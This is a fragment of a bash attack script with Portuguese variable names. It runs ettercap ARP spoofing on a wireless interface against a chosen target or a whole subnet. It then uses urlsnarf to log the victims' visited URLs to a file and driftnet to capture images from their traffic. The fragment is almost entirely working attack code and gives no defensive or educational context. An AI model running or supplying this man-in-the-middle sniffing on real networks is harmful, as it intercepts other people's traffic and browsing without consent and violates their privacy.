...
if [[ "$V" = s ]]; then
      echo -n ">> " ; read alvo
      rm -rf alvo.txt
      gnome-terminal -x bash -c "ettercap -T -q -i wlp3s0 -M arp:remote /$IP/$alvo/"
      gnome-terminal -x bash -c "urlsnarf -i wlp3s0 | grep $alvo > alvo.txt"
      gnome-terminal -x bash -c "alvo.sh"
      driftnet -i wlp3s0
      exit
elif [[ "$V" = n ]]; then
      rm -rf alvo.txt
      gnome-terminal -x bash -c "ettercap -T -q -i wlp3s0 -M arp:remote /$IP//"
      gnome-terminal -x bash -c "urlsnarf -i wlp3s0 > alvo.txt"
      gnome-terminal -x bash -c "alvo.sh"
      driftnet -i wlp3s0
      exit
else
